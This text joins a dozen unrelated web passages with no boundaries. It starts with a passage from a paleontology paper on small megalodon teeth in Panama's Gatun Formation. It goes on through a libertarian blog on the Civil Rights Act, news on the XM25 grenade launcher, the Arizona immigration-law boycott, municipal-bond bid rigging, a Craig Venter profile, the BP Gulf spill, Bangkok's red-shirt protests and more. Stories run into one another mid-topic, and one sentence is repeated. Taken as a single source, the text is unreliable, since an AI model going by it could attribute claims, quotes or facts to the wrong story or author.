B. Expanded geological map ( from “ See Below ” shaded box in Fig. A ) .
This map shows the exposures of the Gatun Formation and surrounding rock units ( modified from Coates et al. , 1992 ) .
The two fossil localities collected from the Gatun Formation during this study include : ( 1 ) Las Lomas and ( 2 ) Isla Payardi .
https://doi.org/10.1371/journal.pone.0010552.g001
Fossil sharks were first reported from Panama in 1862 [ 5 ] .
In 1984 , the first description of the elasmobranchs from the Gatun Formation was published [ 6 ] .
More recently , in 2010 the biodiversity of the fossil sharks from the Gatun has been documented from large new collections , and comprise 16 recognizable taxa .
This work also included paleoecological and paleodepth analyses that supported the interpretation of the paleoecology of the Gatun Formation as shallow - water habitat in a productive environment [ 7 ] .
Although it is not very common , the extinct Carcharocles megalodon ( Agassiz 1843 ) is one of the species that occurs in the Gatun Formation .
The taxonomic assignment of this species has been debated for nearly a century , and there are three possible interpretations : ( 1 ) Some authors place C. megalodon and other megatoothed sharks with the extant white shark ( Carcharodon carcharias ) in the same genus ( Carcharodon ) and therefore the same family ( Lamnidae ) [ 14 ] – [ 16 ] .
( 2 ) Other authors place C. megalodon and megatoothed sharks in a different genus ( Carcharocles ) and family ( Otodontidae ) [ 17 ] – [ 23 ] .
Although a minority point of view , some workers recognize ( 3 ) megatoothed sharks as a series of chronospecies of the genus Otodus , and place all megatoothed sharks except C. megalodon in this genus .
Furthermore , C. megalodon is assigned to the genus Megaselachus , based on the loss of lateral cusplets [ 24 ] .
We follow the second hypothesis ; that Carcharocles megalodon and Carcharodon carcharias belong to separate genera in different families .
However , both species belong to the order Lamniformes , and in the absence of living members of the Otodontidae , C. carcharias should be regarded as ecologically analogous species to C. megalodon .
We base this analogy on the fact that both species share similar ecological niches with presumed similarities in body shape , feeding habits , and overall tooth and vertebral centrum morphology .
Even though these species are not direct relatives , no other extant lamniform species share as many characteristics with C. megalodon as does C. carcharias .
C. megalodon is widely regarded as the largest shark to have ever lived .
Based on tooth crown height ( CH ) , this giant reached a total length ( TL ) of more than 16 m .
One single tooth can exceed more than 168 mm of total height [ 14 ] .
The diagnostic characters of C. megalodon teeth include : large size , triangular shape , fine serrations on the cutting edges , a convex lingual face , a slightly convex to flat labial face , and a large v-shaped neck [ 7 ] .
Juvenile specimens of C. megalodon can have lateral cusplets [ 15 ] , or not [ 22 ] .
The size and shape of the teeth vary within the jaw : anterior teeth are large and symmetrical whereas the latero - posterior teeth are asymmetrical with slanted crowns .
Moving antero - posteriorly through the jaw , there is a slight initial increase in size on either side of the mid-line , followed by a progressive decrease that continues to the last tooth , e.g . [ 25 ] ( Figure S1 ) .
Fossil teeth of C. megalodon range in age from 17 to 2 Ma ( middle Miocene to Pleistocene ) and have a cosmopolitan distribution [ 7 ] , [ 14 ] , [ 16 ] .
Of relevance of this study , two shark paleo - nursery areas have previously been proposed : the Paleocene Williamsburg Formation of South Carolina , based on the presence of juvenile teeth of four lamnoid taxa [ 26 ] ; and the late Oligocene Chandler Bridge Formation of South Carolina , based on the abundance of juvenile Carcharocles teeth , accompanied by small odontocete and mysticete skulls , which are assumed to be their prey species [ 16 ] .
However , neither of the collections from these two localities have been rigorously analyzed and thus the presence of paleo - nurseries remained anecdotal until the present report .
The presence of mammals as potential prey does not represent evidence of a shark nursery area .
As known from modern studies of sharks , the main purpose of the nursery areas is not feeding [ 1 ] – [ 4 ] .
Studies have shown that some shark species do not consume large quantities of food during their juvenile stages [ 27 ] – [ 28 ] .
Even when high - productivity nursery areas provide ample food resources for juvenile sharks , some species select these habitats more for predator avoidance and not food consumption [ 3 ] – [ 4 ] .
Furthermore , some shark species present an ontogenetic shift in feeding patterns [ 29 ] – [ 32 ] .
For example , the lamnoid white shark ( C. carcharias ) feeds mostly on fishes ( including other sharks ) during their juvenile stage and on mammals during their adult stage [ 33 ] – [ 35 ] .
Marine mammals are not commonly found in the Gatun Formation .
On the other hand , bony fish otoliths [ 36 ] and other shark species [ 7 ] are abundant , representing a food source for the marine fauna that lived in this diverse environment .
In this study C. megalodon teeth were collected and measured from two localities within the Gatun Formation of Panama ( Figure 1 ) .
Surprisingly , large teeth are uncommon with specimens recovered having CH ranging between 16 to 72 mm ( Figure 2 ) .
The objective of this work is to determine if the late Miocene Gatun Formation was used as a nursery area by young C. megalodon .
Accordingly , we compared the tooth sizes from the Gatun Formation with those found in older and younger formations to determine if the smaller size distribution observed is unique to the species during the late Miocene .
In addition , we compared these sizes with tooth sets from individuals of different life stages to determine if the small size observed is related to age , or position within the jaw .
Finally , we calculated the TL of all C. megalodon individuals from the Gatun Formation to estimate their life stage .
The results obtained in this study from tooth measurement comparisons and individual total length estimates allowed us to determine the age class / size of individuals that inhabited the shallow - water habitats of the late Miocene Gatun Formation , ∼ 10 million years ago .

Rand Paul Defends His Views on Civil Rights
http://www.youtube.com/watch?v=SI3c7Yj8lYg&playnext_from=TL&videos=KWPbcjnzJhQ
Transcript of Civil Rights Act ( 1964 ) SEC .
202 .
All persons shall be entitled to be free , at any establishment or place , from discrimination or segregation of any kind on the ground of race , color , religion , or national origin , if such discrimination or segregation is or purports to be required by any law , statute , ordinance , regulation , rule , or order of a State or any agency or political subdivision thereof .
This issue is a real test to find out just how much someone believes in the principle of liberty .
The reason this is a sensitive issue is because fortunately , the majority of those in the US find the idea of discrimination based upon race , color , religion , or national origin disgusting .
Legally permitting this type of discrimination as they do in Japan seems inherently un-American .
When I mention to others that Japan has these signs the typical response is “ What the Hell ?
That ’s just wrong ! ”
The existence of the signs gives the impression that the country of Japan as a whole is a racist nation , and Americans would not want this country to be perceived in the same light .
It ’s still an important question to ask if the Civil Rights
Act went too far by not allowing a privately owned business to ever discriminate based upon race , color , religion , or national origin .
The flip - side of the argument is America the type of country that forces people to provide service for others they find morally repugnant ?
Is America they type of country that forces people to associate with other they believe are inherently evil ?
Rachel Maddow ’s asked Rand Paul the question “ Do you think that a private business has the right to say we do n’t serve black people ? ”
Here is a likely hypothetical situation which reverses the roles of who the public sees as having the moral high ground in these debates .
Suppose Fred Phelps and the Westboro Baptist Church decide they are n’t getting enough publicity picketing funerals .
They decide to branch out and adorn themselves with “ God Hates Fags ” or biblical quotes against homosexuality t- shirts and head down to the local gay bar .
The Westboro Baptist Church is protected by the Civil Rights
Act from being denied service based their religious beliefs .
The owner of the bar would be required to serve them , all while the Westboro groups blames the owner and patrons of the bar of all the problems of our nation .
If the owner chose not to serve Fred Phelps , they would be subjected to a lawsuit and would probably lose .
The law clearly upholds the right of all persons without exception to service and has no place for any consideration of the owner of the establishment rights not to be subjected to the humiliation of being forced to serve someone they consider to be Satan incarnate .
With the roles reversed , it ’s clear the owner of a public establishment civil rights are not protected by the Civil Rights Act of 1964 .
Back to Rachel Maddow ’s question :
Do you think a gay bar owner has the right to say , “ We wo n’t serve Fred Phelps ? ”
They currently do n’t have the right , but they should .

A soldier aims an XM25 weapon at Aberdeen Test Center , Md. Credit : US Army .
( PhysOrg.com ) --
The US Army has recently announced plans to test the high - tech XM25 airburst grenade launcher this summer in Afghanistan , unleashing a weapon that veterans predict could be a game - changing advantage in the war .
The XM25 can fire 25 mm rounds that explode at any distance set by a soldier , effective at a range of up to 700 m .
Because the 14 - pound , $ 25,000 gun can fire rounds in just seconds , it could replace the need to call in fire missions , artillery or airstrikes in some situations , which can take anywhere from several minutes to an hour to arrive .
Army officials say that the XM25 could be ideal in current situations in Afghanistan , where the enemy tends to hide behind barriers such as walls and trees or in underground trenches , often at distances of 300 m or more .
Right now , such targets are difficult to hit even for skilled marksmen , since a bullet is only lethal if it hits the head or vital organs .
Since the blast radius of the XM25 is equivalent to a hand grenade , it could allow US soldiers to target and kill these hidden snipers .
For example , if an enemy is hiding inside a distant building , a soldier can point the gun at the building ’s façade , which measures the distance using lasers and sensors .
The soldier can then add ( or subtract ) a smaller distance so that the round explodes at an estimated location close to the enemy .
When the soldier fires , the microchip - embedded round tracks the distance it has traveled by the number of times it rotates .
Upon exploding , the 25 mm round spreads shrapnel in all directions , likely killing anyone nearby .
Compared to a typical M4 carbine , the gun does n’t require extreme precision to kill even at these long ranges , potentially making it one of the deadliest hand weapons in the Army 's arsenal .
This live - fire demo shows the XM25 firing rounds through the window of a simulated building .
" It brings , right now , organic to the squad , the capability to defeat targets that we 're seeing everyday in Afghanistan -- targets that we can't currently hit , " said Col .
Doug Tamilio , project manager for soldier weapons with the Army 's Program Executive Office Soldier .
" It will save soldiers ' lives , because now they can take out those targets . "
After the weapon is tested by a group of Army Special Forces Soldiers this summer , Army officials may expand the use of the weapon in the future .
The Army is currently deciding whether to purchase 12,500 of the weapons , which are made by Heckler and Koch , although a final decision is awaiting a program review by senior Army officials .

From Zero to a Million Users - Dropbox and Xobni lessons learned
May , 2010
I just finished a talk at Web 2.0 Expo titled From Zero to a Million Users with Drew Houston , the founder of Dropbox .
It 's about what we wish we had known years ago when it comes to growing your user base from 1 to 1 M users .
We had a lot of fun with it .

A minority suppliers group that would have brought 7,000 convention attendees to Phoenix this fall has moved the meeting to Florida because of Arizona 's new immigration law .
The National Minority Suppliers Development Council , Inc. released a statement , which Phoenix officials received today .
The council is the latest of several out - of - town groups that have canceled Valley meetings because of the law .
Metropolitan Phoenix risks losing as much as $ 90 million in hotel and convention business over the next five years because of the controversy , according to one Phoenix estimate .
The stakes for Phoenix are particularly high because the city operates the Phoenix Convention Center and it owns the 1,000 - room Sheraton Phoenix Downtown Hotel , which serves the convention center .
Many of the hotels and resorts that would be boycott targets are also located in Phoenix .
The minority suppliers group will hold its October national convention in Miami instead , the statement said .
The Arizona law " is inconsistent with the ideals and principles upon which the NMSDC operates , including valuing diversity and inclusion for all , " the statement said .
Founded in 1972 , the National Minority Suppliers Development Council matches more than 15,000 businesses owned by Asian , Black , Hispanic and Native Americans with member corporations that want to purchase goods and services , according to the group 's website .
It will be difficult for Phoenix to replace the canceled events , because such meetings are usually booked years in advance , said Deputy City Manager David Krietor .
The convention center is also having difficulty booking future events because of the publicity about the law , he said .
The sales office phones " have stopped ringing , " he said .
Arizona 's immigration law makes it a state crime to be in the country illegally .
It states that an officer engaged in a lawful stop , detention or arrest shall , when practicable , ask about a person 's legal status when reasonable suspicion exists that the person is in the U.S. illegally .
Supporters say the law merely builds upon existing federal law .
Opponents say that the law may lead to racial profiling .
If you thought the SEC ’s charges against Goldman Sachs poured fuel on an already - raging populace fire , Wall Street ’s involvement in a massive bid rigging scandal in the $ 2.8 trillion municipal bond market will fan the flames even more .
If you thought the SEC ’s charges against Goldman Sachs poured fuel on an already - raging populace fire , Wall Street ’s involvement in a massive bid rigging scandal in the $ 2.8 trillion municipal bond market will fan the flames even more .
Earlier this month , we heard about an SEC investigation of conflicts of interest at big banks that bought credit default swaps on muni bonds they sold to state and local governments .
But Bloomberg is out with a big investigative piece today about a massive bid-rigging scandal in the muni market that , if true , bilked 160 state agencies , local governments and non-profits out of hundreds of millions of dollars .
The alleged conspiracy centered around so - called guaranteed investment contracts , or GICs , which acted like certificates of deposit for the cash raised from muni bond offerings .
The interest rates on GICs are n’t published so governments were mandated to put the contracts out for competitive bidding .
They hired small advisory firms to run the auctions to get the highest interest rates .
But that process appears to have been rigged , according to indictments against one of the advisory firms , CDR Financial Products of Beverly Hills , which is cited in the Bloomberg story .
The FBI has also raided several of CDR ’s competitors including Investment Management Advisory Group , known as Image , and Sound Capital Management , but have n't yet charged them .
The charges against CDR claim the firm told over a dozen big banks that sell GICs including JPMorgan , UBS , Lehman Brothers , Wachovia , Bank of America and Citigroup , how to lowball their bids to win business from the state and local governments .
The banks , in turn , paid kickbacks to CDR .
“ The whole investment process was rigged across the board , ” said Charlie Anderson , who retired in 2007 as head of field operations for the Internal Revenue Service ’s tax - exempt bond division .
“ It was so commonplace that people talked about it on the phones of their employers and ignored the fact that they were being recorded . ”
Three former CDR employees have pleaded guilty to wire fraud and conspiracy to rig bids and more guilty pleas are in the works .
A former unnamed BofA banker , who has been cooperating since 2007 , is the government ’s key man in the investigation .
In exchange for its cooperation , BofA has received amnesty from any future prosecution .
To offer amnesty to a bank these days indicates the government is working on a major investigation that could do some major damage to Wall Street 's already shaky reputation .
It is far too soon to know the answer .
Writing in The Future of Children , a journal produced through a collaboration between the Brookings Institution and the Woodrow Wilson Center at Princeton University , Kaveri Subrahmanyam and Patricia M. Greenfield , psychologists at California State University , Los Angeles , and U.C.L.A. respectively , noted : “ Initial qualitative evidence is that the ease of electronic communication may be making teens less interested in face - to - face communication with their friends .
More research is needed to see how widespread this phenomenon is and what it does to the emotional quality of a relationship . ”
But the question is important , people who study relationships believe , because close childhood friendships help kids build trust in people outside their families and consequently help lay the groundwork for healthy adult relationships .
“ These good , close relationships — we can’t allow them to wilt away .
They are essential to allowing kids to develop poise and allowing kids to play with their emotions , express emotions , all the functions of support that go with adult relationships , ” Professor Parker said .
“ These are things that we talk about all the time , ” said Lori Evans , a psychologist at the New York University Child Study Center .
“ We do n’t yet have a huge body of research to confirm what we clinically think is going on . ”
What she and many others who work with children see are exchanges that are more superficial and more public than in the past .
“ When we were younger we would be on the phone for hours at a time with one person , ” said Ms. Evans .
Today instant messages are often group chats .
And , she said , “ Facebook is not a conversation . ”
One of the concerns is that , unlike their parents — many of whom recall having intense childhood relationships with a bosom buddy with whom they would spend all their time and tell all their secrets — today ’s youths may be missing out on experiences that help them develop empathy , understand emotional nuances and read social cues like facial expressions and body language .
With children ’s technical obsessions starting at ever - younger ages — even kindergartners will play side by side on laptops during play dates — their brains may eventually be rewired and those skills will fade further , some researchers believe .
Gary Small , a neuroscientist and professor of psychiatry at U.C.L.A. and an author of " iBrain : Surviving the Technological Alteration of the Modern Mind , " believes that so - called “ digital natives , ” a term for the generation that has grown up using computers , are already having a harder time reading social cues .
“ Even though young digital natives are very good with the tech skills , they are weak with the face - to - face human contact skills , ” he said .
There is , appropriately enough , a biblical quality to Craig Venter 's account of the genesis of his quest to create life " from scratch " .
He dates his mission to 1968 when he was working in the frontline medical corps of the US army in Vietnam during the Tet offensive .
He had tried , and mostly failed , to save hundreds of men from dying – it was M * A * S * H without jokes – and he felt he'd had enough of the horror of life .
A champion swimmer , he determined to swim out into the South China Sea and not swim back .
In the beginning , then , this mythology goes , the biologist was in the middle of the ocean , " surrounded by venomous sea serpents " , preparing to meet his genome .
It took a shark circling to wake him out of this suicidal fantasy .
" For a moment , " he wrote in his 2007 autobiography , " I was angry that the shark had disrupted my plan .
Then I became consumed with fear .
What the fuck was I doing ?
I wanted to live … "
Venter struck out for shore , now miles behind him , and when he arrived there it was if he had been reborn , like Crusoe , into a new fate : " I lay on the sand , naked , for what felt like hours .
I was exhausted and relieved .
I wanted my life to mean something ; I wanted to make a difference .
I felt pure ; I felt energised . "
For the last 40 years , that pure energy has driven Craig Venter to extraordinary heights .
( " A doctor can save maybe a few hundred lives in a lifetime , " he told his brother as he embarked on his scientific career , with a characteristic mix of hubris and chutzpah .
" A researcher can save the whole world . " )
Venter first came to international attention as the " rogue " biologist who attached himself to the painstaking $ 5bn , 15 - year programme to decode the human genetic blueprint , " the book of life " Human Genome Project and announced to anyone who would listen he could do it much more quickly and much more cheaply with private capital ( the distinguished scientists leading the global initiative were , he insisted , " the Liars Club " : habitual fibbers about costs and deadlines ) .
He caused further outrage when he said he would not only beat that establishment club to the solution but patent the results .
He eventually – arguably – made good the first part of that boast but , under pressure from President Clinton , gave up on the latter and agreed a joint declaration of the triumph with the official team in the millennium year , losing a fortune in the process .
( Asked how he felt to have deciphered human life , Venter , who had designs on being " the first billionaire biochemist " , replied : " Poorer . " )
Not content with what was widely considered the landmark scientific achievement of our age , however , Venter then decided he would solve the crisis of climate change and ecological meltdown by discovering a biologically engineered source of energy .
He set sail on his $ 15 m yacht Sorcerer II on an unending voyage with the mission , along the way , " to put everything that Darwin missed into context " and map the whole world 's genetic components .
He dipped buckets into the Sargasso Sea and sent millions of primordial microbial lifeforms back to his labs for decoding .
As a development of that ongoing effort , last week Venter announced in the pages of Science magazine that his research team had – by putting together a living and replicating bacterium from synthetic components , inserting a computer - generated genome into a cell – " created life " in the laboratory for the first time .
The experiment suggested the possibility of creating bacteria to perform specific functions : as producers of fossil fuels or medicines .
Venter , now 63 , is nothing if not a showman and the publication of this revelation and the subsequent press conferences , have polarised opinion in ways with which he has long been familiar .
Some authorities , and several newspaper leader writers , have claimed him as our Galileo or our Einstein ; others have been notably underwhelmed .
Freeman Dyson , the physicist , captured the full range of academic sentiment in this dry appraisal : " This experiment is clumsy , tedious , unoriginal .
From the point of view of aesthetic and intellectual elegance , it is a bad experiment .
But it is nevertheless a big discovery … the ability to design and create new forms of life marks a turning point in the history of our species and our planet . "
Venter 's ego and his preference to turn to corporations rather than research foundations as funding partners ( Exxon Mobil is a $ 600 m sponsor of his energy experiments ) do not tend to endear him to the academic establishment .
Steve Jones , professor of genetics at University College London , and a perennial voice of reason , offered me this verdict on the biologist 's latest headlines .
" It 's very easy to mock Venter , " Jones suggests .
" When he first appeared , people just kind of sneered at him .
But they stopped sneering when they saw his brilliance in realising that the genome was not a problem of chemistry but a problem of computer power .
I do n't think anybody can deny that that was a monumental achievement and he has been doing fantastically interesting things subsequently with marine life .
Having said that , though , the man is clearly a bit of a prick and one with a serial addiction to publicity . "
Jones is sceptical about the hyperbole of breathless headlines .
" The idea that this is ' playing God ' is just daft .
What he has done in genetic terms would be analogous to taking an Apple Mac programme and making it work on a PC – and then saying you have created a computer .
It 's not trivial , but it is utterly absurd the claims that are being made about it . "
Stewart Brand , the ecological visionary and creator of the Whole Earth Catalog , is more persuaded .
Brand has got to know Venter over the last couple of years through John Brockman 's Edge initiative which brings together the world 's pioneering minds .
What differentiates Venter from many of his peers , Brand believes , is that he is not only a brilliant biologist , but also a brilliant organisational activist .
" A lot of people can think big but Craig also has the ability to fund big : he does n't wait for grants , he just gets on and finds a way to do these things .
His great contribution will be to impress on people that we live in this vast biotic of microbes .
What he has shown is that microbial ecology is now where everything is at . "
Brand once suggested that " we are as gods and we might as well get good at it " .
That statement has gained greater urgency with climate change , he suggests .
" Craig is one of those who is rising to the occasion , showing us how good we can be . "
On the publication of his autobiography , Venter also brought out another book , one that contained the six billion characters of his own genome .
It was the first full catalogue of a single individual 's genetic code and it revealed several secrets about Venter 's inherited traits , notably a predisposition to heart disease and to Alzheimer's .
What it has not so far rendered , however , is the chemical clue to his most vital characteristic : impatience .
The greatest scientists have shared the understanding that there is so much to do and so little time in which to do it .
A decade ago , Venter was plagued by the sense that " as a civilisation , we know far less than 1 % of what will be known about biology , human physiology and medicine .
My view of biology is : we do n't know shit " .
In the years since , he has perhaps done more that any man who has ever lived to add to that raw information .
He did this initially by being the first to see that " the analogue world of biology " had to be transformed by the " digital world of the microchip " .
He is now , it is said , the largest private user of computer power in the world .
Just as he found his vocation in the sea , so he returns to it constantly for inspiration .
He was a high school dropout , a prototype beach bum .
" I was a surfer as a kid , I was a surfer in Vietnam , I am still a surfer , " he likes to say .
When a writer for Wired magazine caught up with him in French Polynesia a couple of years ago , Venter was wandering the shoreline , naked , fishing items of interest out of the water .
At the time , he described his scientific quest by gesturing to the ocean : " We 're just trying to figure out who fucking lives out there . "
Of the billions of answers to that particular question , Venter himself has now added another one : Mycoplasma mycoides J Craig Venter Institute - syn1.0 .
Life has his name on it .
A growing chorus of politicians and pundits now agree that if President Obama had just done X , Y , or Z , then the devastation in the Gulf of Mexico could have been more effectively managed .
In a narrow sense , some of their points certainly have validity .
After all , it 's easier to figure out what you should have done than to figure out what you should do , and with the benefit of hindsight , it wo n't be hard to point out mistakes .
But in a larger sense , as Crashing Vor argues in a recommended diary , this type of prattle misses the point .
Anyone who suggests that they know how to effectively manage a leak like the one gushing into the Gulf of Mexico is either dishonest or delusional or both .
When you have a leak flooding nearly 100,000 barrels of oil each day and you do n't have technology that can quickly stop that leak , you 're going to have a disaster .
And there 's nothing you can do to prevent it .
You can try to minimize the damage and you can hold the responsible parties accountable .
These are things you have to do .
But you 're still basically at the mercy of the oil .
It 's nasty stuff .
It will never be a secure source of energy .
And claiming that you have a plan to spare us from the devastation of this leak is to deny that essential fact .
Take Bobby Jindal .
He says that he 's got a plan to protect Louisiana from the oil .
He says all they need to do is build a 60 mile stretch of barrier islands to keep the oil out .
Oh , and they also need another 13 million feet of boom .
And he blames the Federal government for bureaucratic red tape on the islands and for not giving him the boom he needs .
C'mon , Bobby .
You know it would take six months to build the islands , and that assumes no storms damage them as they 're being built .
Six months is too late , and even if they get built , doing it that fast means the next major storm to come along will destroy them .
And 13 million feet of boom sounds nice , but that would be more than 4 times the amount of boom that 's already been laid out and 10 times more boom than we have available in the entire U.S .
Jindal probably likes the sound of his voice when he says he has a solution to dealing with this leak , but the fact that his solution is such utter nonsense underscores this one central , immutable fact : oil is dangerous , and there 's no way to make it safe .
Yes , we 're addicted to it .
No , we 're not going to stop using it overnight .
But we must break that addiction .
And if do n't learn that lesson from this tragedy , we 're going to be taught it again , and again .
And each time the consequences will keep on getting worse .
Hundreds of children remain behind redshirt barricades as troops prepare to remove all demonstrators by force
This article is more than 10 years old
This article is more than 10 years old
The Thai army today accused anti-government protesters of using children as human shields to keep troops from marching on their protest camp in the centre of the capital .
Hundreds of children remain behind the barricades of the fortified red - shirt compound , hours after a government deadline for them to leave passed , and as troops prepare to remove all demonstrators by force .
On Thai television tonight , an army spokesman , Colonel Sansern Kaewkamnerd , showed a photo of a young boy being held to stand atop the tyre barricades built by the protesters to hold back advancing troops .
" The reason why officers can't go into the area is because of this – the terrorists are using children and women as their shields , " the officer said .
It is not known how long the boy was held on the barriers or how close troops were to him .
Allegations of various abuses are part of the ongoing public relations battle being waged by both sides for the hearts and minds of the Thai and international communities .
But already one child has been killed in the violence which has raged in Bangkok for the past five days .
A 14 - year - old boy was shot in the stomach by soldiers when the van he was travelling in failed to stop at a checkpoint on Saturday .
For two days details of his death were excluded from the official statistics of the number of people killed – which has now reached 36 .
Both sides of Bangkok 's deepening political divide now say more violence appears inevitable , with a key protest leader saying their stand will end with potentially hundreds dead – " our Tiananmen Square " .
Desperate last - minute negotiations collapsed in acrimony today and the government has vowed not to negotiate again with red shirt protest leaders while demonstrators remain on the streets .
Sources told the Guardian the army was planning to march on protesters in the early hours of Wednesday .
Some 6,000 people remain within the sprawling compound in Bangkok 's shopping and finance districts , camped behind barricades of tyres , concrete and sharpened bamboo staves .
At least half are women and hundreds are children .
One protester , Kanok Boonmee , told the Guardian she had no family to place her eight - year - old son Gee with while she supported the red shirt movement .
" There is nowhere else for him to be , " she said .
" This protest [ is ] important for Thailand , he wants to be here [ to ] change our country . "
But other parents said they had sent their children to stay with relatives out of Bangkok , as the violence worsened .
Dozens of families also remain trapped in the blacked - out suburbs of the no-man 's land between the red shirt barricades and troop lines .
The government had demanded that all children , women and elderly people leave the central city protest site by 3 pm Bangkok time today , before troops moved in .
Protesters who left before the deadline would not face charges , the government said , but those who remained would be treated as criminals .
But efforts to encourage protesters to leave became mired in bureaucracy and mistrust .
Several hundred people who gathered at a meeting point at a temple inside the contested area found that the promised transport to take them to safety had not come .
Elsewhere across the capital , firefights between troops and protesters raged on , with red shirt rocket attacks against luxury hotels housing foreigners .
The red shirts also attempted to blow up a gas tanker rolled on to a major road on the southern edge of the conflict .
The Dusit Thani hotel , housing more than 100 foreigners , was targeted by a grenade attack from within the red shirt compound .
There were no injuries , but guests were evacuated and the hotel is now closed .
A red shirt leader , Sean Boonpracong , told the Guardian he feared the protest would end as Thailand 's Tiananmen Square , with hundreds more dead .
" The people are defiant .
They do not trust the government .
They do n't want violence , but they are prepared to fight with their bare hands .
The government does not want to negotiate , so I think many more people will die .
This will end as our Tiananmen Square . "
Another key red shirt , Jatuporn Prompan , said only the intervention of Thailand 's King could prevent more bloodshed .
" As people in this country , we would like his kindness .
I believe that Thais will feel the same , that His Majesty is our only hope . "
Tensions across the city escalated further when it was announced that the red shirts ' paramilitary leader , suspended army major general Seh Daeng , had died after being shot by a sniper last Thursday .
As soldiers tightened their control around the red shirts ' camp yesterday , the situation on the streets of the contested zone between troops and protesters deteriorated further .
Overnight , black - clad guards red shirts had used the cover of darkness and gaps in the troop cordon to smuggle weapons into their camp , and protesters began looting stores and threatening the few foreigners in the area .
BP oil spill hits Gulf coast
By Tom Eley
1 May 2010
On Friday , an oil slick caused by last week ’s explosion and sinking of a British Petroleum oil rig in the Gulf of Mexico began washing ashore in Louisiana near the mouth of the Mississippi River , threatening catastrophic economic and environmental damage .
The Deepwater Horizon oil rig , located about 50 miles off the Louisiana coast , erupted in flames on April 20 when a concrete sealant failed and oil moved up piping from the ocean floor , about a mile beneath the surface of the water .
The disaster claimed the lives of 11 workers and critically injured four more .
After burning for two days , the floating rig sank , buckling beneath it the piping connecting it to the oil well and causing at least three ruptures .
A mechanism used to seal the well in the event of a blowout failed to activate , and crude oil has been gushing into the Gulf of Mexico at an estimated rate of 5,000 barrels , or 210,000 gallons , a day .
BP and the Obama administration at first claimed that there was no oil spill .
After a slick on the ocean ’s surface increased to an area of about 320 square miles , BP said that 1,000 barrels were pouring forth .
On Thursday BP admitted that the Coast Guard estimate of 5,000 barrels was more likely .
On Friday morning the BBC reported that the oil slick was roughly equivalent in size to Jamaica , and growing .
It appeared set to continue washing ashore in Louisiana , and was likely to spread east along the gulf coastline in Mississippi , Alabama , and Florida .
Efforts to contain the spill and prevent further oil from reaching the ocean surface have achieved little .
On Friday attempts to ring the slick with booms and administer controlled burns were hampered by wind and choppy seas .
A high tide is expected Friday night , likely pushing oil further up delicate marshlands in the Mississippi delta .
Ultimately the spill must be stopped at its source near the oil cap and crushed piping located 5,000 feet beneath the ocean ’s surface .
Valves designed to shut the cap and remote controlled submarines have been unable to stop the hemorrhaging .
Other methods — including placing a structure over the leaks or drilling holes nearby to divert oil from reaching the existing well — are experimental and would take weeks or months to implement .
In the meantime , the collapsed rig will likely continue to pump out about 210,000 gallons per day into the Gulf of Mexico .
At this pace the Deepwater Horizon spill would by mid-June eclipse the disaster resulting from the sinking of the Exxon Valdez , which in 1989 dumped its payload of 10.8 million gallons of crude oil into remote Prince William Sound in Alaska .
In the worst case scenario oil could flow from the well until its supply is exhausted , which would likely result in a spill many times larger than the Exxon Valdez .
The economic impact of the Deepwater Horizon spill will be severe .
The coast ’s multi-billion dollar fishing and tourism industries will suffer major losses , which will result in layoffs and job cuts .
It is possible the slick could block shipping from the port of New Orleans — the nation ’s busiest in terms of freight tonnage .
Shrimp and oyster fishermen have launched lawsuits against BP , rig operator Transocean , and Halliburton Energy Services , who subcontracted work on the drill hole .
“ This might be our last day , ” oyster farmer Mitch Jurisich told the Associated Press .
“ This is who we are and what we do . ”
“ If it gets in oyster reefs and grass beds — terribly productive areas — you do n’t exactly run a vacuum cleaner over it , ” said George Crozier , a marine biologist with the Dauphin Island Sea Lab in Alabama .
“ The grass beds are particularly fragile in our part of the world .
So even trying to clean it would probably destroy them . ”
The environmental impact is incalculable .
The estuaries , islands , and bayous of the Mississippi Delta — the area likely to be hardest hit by the spill — contain 40 percent of all US wetlands and are home to hundreds of animal species .
“ It is of grave concern , ” said David Kennedy of the National Oceanic and Atmospheric Administration .
“ I am frightened .
This is a very , very big thing .
And the efforts that are going to be required to do anything about it , especially if it continues on , are just mind - boggling . ”
For nearly a week the Obama administration said virtually nothing about the disaster — besides reiterating that the “ incident , ” as Obama called it , would in no way lessen its support for the lifting of a moratorium on offshore drilling up and down the Atlantic Coast .
Two days after the explosion , when the fate of the missing 11 men was still unknown , a reporter asked White House Press Secretary Robert Gibbs if Obama had yet “ reached out to anyone in Louisiana over the oil rig explosion . ”
Gibbs responded , “ Let me check on that .
I do n’t believe so . ”
The next day , Gibbs told reporters , “ In all honesty I doubt this is the first accident that has happened and I doubt it will be the last . ”
Finally , on Friday morning , senior Obama advisor David Axelrod admitted that the oil spill was a disaster that might temporarily delay further seabed oil exploration .
Later in the day , Obama told a Rose Garden press conference that he had ordered Secretary of the Interior Ken Salazar to report to him within 30 days if any new safeguards are needed for deap sea oil rigs .
Obama ’s statement was “ a largely symbolic gesture , ” according to the Associated Press , since “ no new leases are scheduled for the coming months . ”
Its transparent purpose was to protect Obama ’s “ planned expansion of offshore drilling , ” according to the AP .
On Friday , the Obama administration dispatched two air force planes and a number of warships to assist in containing the slick , and Louisiana Governor Bobbie Jindal requested a call - up of about 6,000 National Guard soldiers .
However , experts have said that miniature submarines used by the Navy would be of no help in stopping the leaks .
Due to the topography and biology of the Mississippi Delta — muddy and rich in water vegetation — cleanup will prove difficult .
The parallels with Hurricane Katrina are striking .
As that massive storm system approached the Gulf Coast in 2005 , the Bush administration could not be roused to take elementary steps to assist area residents .
Then , after Katrina struck , a stunned nation watched on television as desperate residents begged for relief .
The Gulf Coast has never recovered from Katrina , and now some experts have predicted that the Deepwater Horizon spill could prove more economically devastating .
The Wall Street Journal wrote of “ a growing sense among many in Louisiana that the government failed them again , just as it did during Hurricane Katrina five years ago . ”
“ They lied to us , ” fishing guide Cade Thomas told the Journal .
“ They came out and said it was leaking 1,000 barrels when I think they knew it was more .
And they were n’t proactive .
As soon as it blew up , they should have started wrapping it with booms . ”
Why BP and the federal government did not take immediate precautions to cordon off the explosion area in the immediate aftermath of the explosion is just one of many questions that have emerged .
It has also been revealed that the Obama administration had buckled before BP and oil industry pressure , failing to implement new safety and environmental regulations under consideration last fall .
A BP executive wrote a letter to the administration stating that self - regulation was adequate .
Among the regulations that BP and other oil concerns were able to block was the inclusion on all oil rigs of a device called an acoustic switch — commonly used in other oil - producing nations — that sends impulses through the water that can trigger an underwater valve to shut down the well in the event of a blowback .
BP found the costs of these units , about $ 500,000 , excessive .
The oil giant reported $ 5.598 billion in profits for the first three months of 2010 .
Eviction teams in Hubei province have found themselves fleeing for cover after a farmer twice used a homemade rocket launcher in recent months to try and ward them off , China Daily reported on Tuesday .
